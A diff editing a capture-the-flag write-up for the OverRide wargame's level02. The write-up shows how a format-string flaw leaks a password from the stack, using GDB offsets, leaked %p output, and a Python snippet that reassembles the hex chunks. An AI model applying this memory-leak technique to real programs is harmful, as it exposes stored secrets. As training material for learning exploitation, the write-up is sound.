@@ -39,9 +39,9 @@ First, let's use GDB to take a look at the three memory allocations:
    0x0000000000400869 <+85>:    lea    -0x110(%rbp),%rdx          // user_name[112]
 [...]
  ```
-There is an offset of 48 bytes beetween the password buffer and the user_name buffer. So we know that only the first 40 bytes will contain the password.
+There is an offset of 48 bytes between `password` and `user_name`, so we know that our password will start 48 bytes before `user_name`, and that only the 40 first bytes will contain the actual password. 
 
-Next, we need to print the stack and find out where our buffer is, and this allows us to also peek at values stored higher on the stack:
+Next, we need to print the stack and find out where our buffer is. This also allows us to peek at values stored higher on the stack:
 ```Shell
 level02@OverRide:~$ ./level02
 ===== [ Secure Access System v1.0 ] =====
@@ -53,7 +53,7 @@ level02@OverRide:~$ ./level02
 *****************************************
 AAAAAAAA 0x7fffffffe500 (nil) 0x63 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6f8 0x1f7ff9a08 0x756f63756f63 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x4141414141414141 0x2520702520702520 0x2070252070252070 does not have access!
 ```
-The user_name buffer starts at the 28th argument, `0x4141414141414141`. The 27th argument contains the last 8 bytes of the pass buffer, so we can skip that and get the 5 previous arguments (40 / 8, as addresses are 8 bytes long) to display the entire password.
+`user_name` starts at the 28th index, `0x4141414141414141`. The 27th index contains the last 8 bytes of the pass buffer, so we can skip that and get the 5 previous arguments to display the entire password (we do 40 / 8 because addresses are 8 bytes long).
 
 ```Shell
 level02@OverRide:~$ ./level02 
@@ -72,7 +72,7 @@ Good, we have the entire password, but we need to:
 - reverse them from little endian to big endian
 - concatenate each strings to form the final password.
 
-Using a python script can help make it fast and easy:
+Using a python script is very efficient:
 ```Python
 >>> hex_values = [
 ...     "756e505234376848",
